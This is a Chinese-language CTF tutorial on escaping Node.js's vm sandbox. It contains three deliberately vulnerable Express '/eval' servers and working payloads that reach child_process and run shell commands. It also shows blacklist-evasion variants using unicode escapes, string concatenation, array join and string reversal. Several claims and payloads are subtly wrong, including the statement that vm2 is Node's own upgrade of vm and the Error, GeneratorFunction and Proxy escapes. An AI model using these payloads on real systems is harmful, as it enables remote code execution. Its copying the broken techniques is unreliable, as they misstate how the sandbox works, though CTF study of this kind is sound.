==什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。

==在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。==

==主要内容就是通过网站给的沙箱环境，我们要想办法获得一些全局变量，调用一些命令执行的函数从而执行系统命令。

## vm模块用法

`vm.runinThisContext(code)`：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。

`vm.createContext([sandbox])`：在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。

`vm.runInContext(code, contextifiedSandbox[, options])`：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相。

`vm.runInNewContext(code[, sandbox][, options])`:creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。

vm.Script类 vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行

`new vm.Script(code, options)`：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。

## 题目示例

### 例题一：无过滤

```javascript
const vm = require('vm');
const express = require('express');
const app = express();

app.use(express.json());

app.post('/eval', (req, res) => {
    const userCode = req.body.code;
    const sandbox = { console, data: "test" };
    
    try {
        const result = vm.runInNewContext(userCode, sandbox);
        res.json({ success: true, result: result.toString() });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

这是模拟一道简单的vm逃逸的题目。

#### **分析：**

通过vm模块构造了一个沙箱环境，提供一个接口`/eval`，通过post方法提交`json`数据作为`usercode`,执行js代码。

沙箱只提供了`console、data`两个属性。没有任何限制，可以直接逃逸。

#### 逃逸：

payload：

```json
{
"code"  :  "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString()"
}
```

这是vm逃逸的最经典的payload。

- `this`指向了传入沙箱环境的变量，就是对象`sandbox`。
    
- `constructor`获取构造函数，对象的构造函数是`Object`。
    
- 继续`constructor`获取`Object`的构造函数，最底层的构造函数`Function`
    
- 通过`Function`构造函数可以直接构造函数。
    
- 构造函数后()调用函数，获得了`process`模块。
    
- 通过`process`模块导入`child_process`模块，这是命令执行模块
    
- 后面就是命令执行了，返回的是二进制流，通过toString获取内容
    

### 例题二：黑名单过滤

```javascript
app.post('/eval', (req, res) => {
    let userCode = req.body.code;
    
    // 黑名单过滤
    const blacklist = ['constructor', 'process', 'require', 'child_process', 'exec', 'mainModule'];
    if (blacklist.some(word => userCode.toLowerCase().includes(word))) {
        return res.json({ success: false, error: 'Dangerous code detected!' });
    }
    
    const sandbox = { console, data: "test" };
    const result = vm.runInNewContext(userCode, sandbox);
    res.json({ success: true, result: result.toString() });
});
```

#### 分析：

依旧是通过post提交json数据，执行命令。

但是这次有了过滤字符串。

#### 逃逸：

先简单尝试一下，

```json
{"code": "constructor"} // 被拦截
{"code": "process"}     // 被拦截
{"code": "require"}     // 被拦截
```

value内容包括了黑名单内容会被拦截，

我们尝试绕过。

1. unicode字符编码绕过
    

```json
{
  "code": "this['\\u0063onstructor']['\\u0063onstructor']('return pro\\u0063ess')().mainModule['re\\u0071uire']('child_pro\\u0063ess').execSync('cat /flag').toString()"
}
```

2. 字符串拼接绕过
    

```json
{
  "code": "this['con' + 'structor']['con' + 'structor']('return pro' + 'cess')().mainModule['req' + 'uire']('child_' + 'process').execSync('cat /flag').toString()"
}
```

3. 使用数组join绕过
    

```json
{
  "code": "this[['c','o','n','s','t','r','u','c','t','o','r'].join('')][['c','o','n','s','t','r','u','c','t','o','r'].join('')]('return process')().mainModule[['r','e','q','u','i','r','e'].join('')](['c','h','i','l','d','_','p','r','o','c','e','s','s'].join('')).execSync('cat /flag').toString()"
}
```

4. 使用反向字符串绕过
    

```json
{
  "code": "this['rotcurtsnoc'.split('').reverse().join('')]['rotcurtsnoc'.split('').reverse().join('')]('return process')().mainModule['eriuqer'.split('').reverse().join('')]('child_process').execSync('cat /flag').toString()"
}
```

### 例题三：受限沙箱环境（无原型链环境）

```javascript
app.post('/eval', (req, res) => {
    const userCode = req.body.code;
    
    // 使用纯净沙箱
    const sandbox = Object.create(null);
    sandbox.data = "test";
    
    // 设置超时
    const script = new vm.Script(userCode);
    const context = vm.createContext(sandbox);
    
    try {
        const result = script.runInContext(context, { timeout: 1000 });
        res.json({ success: true, result: String(result) });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});
```

#### 分析：

一般的类都是默认继承了`Objct`类，所以不管怎么继承，最终都可以通过原型链找到object类，造成原型链攻击

但是`const sandbox = Object.create(null);`这样写就是创建了一个纯净的类，这个类没有原型链，所以无法造成原型链攻击。

#### 逃逸：

##### 1. 尝试 arguments.callee.caller
    

```json
{
  "code": "(function(){ return arguments.callee.caller.constructor.constructor('return process')(); })()"
}
```

- `arguments`中包含了所在函数传入的参数信息
    
- `callee`属性：指向当前正在调用的函数
    
- `caller`属性：执行正在调用当前函数的函数

这样在题目环境中来看就是，通过`arguments.calle`找到了当前的`function`函数，再通过`function.caller`找到了调用`function`的那个函数此时已经逃逸出来了，再通过经典方法攻击

**注意**：

最大的前提：沙箱环境没有启用 JavaScript 的严格模式 (`'use strict'`)。在严格模式下，访问 `arguments.callee`和 `arguments.caller`会抛出错误。

沙箱的实现方式必须是：用一个真实的 JavaScript 函数来调用你的代码。如果沙箱的执行引擎是 Node.js 底层的 C++ 代码，那么 `.caller`可能指向一个不存在或无法访问的内部函数。

##### 2. 利用异常对象（Error Object）
    

```javascript
try { throw new Error('test') } catch(e) { return e.constructor.constructor('return process')(); }
```

主动抛出错误获得错误对象，他不是一个纯净对象，所以存在原型链

##### 3. 利用 GeneratorFunction（了解）
    

```javascript
const GeneratorFunction = Object.getPrototypeOf(function*(){}).constructor;
new GeneratorFunction('return process')().mainModule.require('child_process').execSync('whoami').toString();
```

- 完全抛弃传统的原型链，转而利用 ES6 引入的 Generator 函数来获取一个新的 `Function`构造函数入口。
    
- 原理步骤拆解：
    
    - `function*(){}`：定义一个 Generator 函数（生成器函数）。
        
    - `Object.getPrototypeOf(function*(){})`：获取这个生成器函数的原型。生成器函数的原型是一个名为 `GeneratorFunction`的特殊对象。
        
    - `.constructor`：获取 `GeneratorFunction`的构造函数，这个构造函数本质上和全局的 `Function`构造函数能力相同，可以用来动态创建函数。
        
    - `new GeneratorFunction('return process')()`：用这个构造函数创建一个返回 `process`的函数并立即执行。
        

#####  4. 利用 Proxy 对象（终极想象）

Payload:

```javascript
const p = new Proxy({}, {get: function() {return Function.prototype.constructor;
    }
});
p.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString();
```

- 设计思路：利用 `Proxy`的 `get`陷阱方法，在访问任何属性时都直接返回 `Function`构造函数，从而绕过对 `constructor`属性的直接访问。
    
- 原理步骤拆解：
    
    - `new Proxy({}, { ... })`：创建一个代理对象 `p`。
        
    - 为这个代理对象设置一个 `get`陷阱（trap）。
        
    - 当我们访问 `p.constructor`时，`get`陷阱会被触发。
        
    - 这个陷阱忽略了你实际访问的属性是什么，直接返回 `Function.prototype.constructor`（也就是 `Function`）。
        
    - 拿到 `Function`后，逃逸成功。
        
- 成功前提：
    
    - 沙箱环境支持 ES6 的 `Proxy`语法。
        
    - 沙箱没有对 `Proxy`本身进行禁用或限制。
        
    - 这是一个非常巧妙的思路，但实际能否成功取决于沙箱的具体实现。
        
- 有效性：不确定，但值得一试。它代表了攻击者的一种创造性思维，试图利用更高级的语言特性来突破封锁。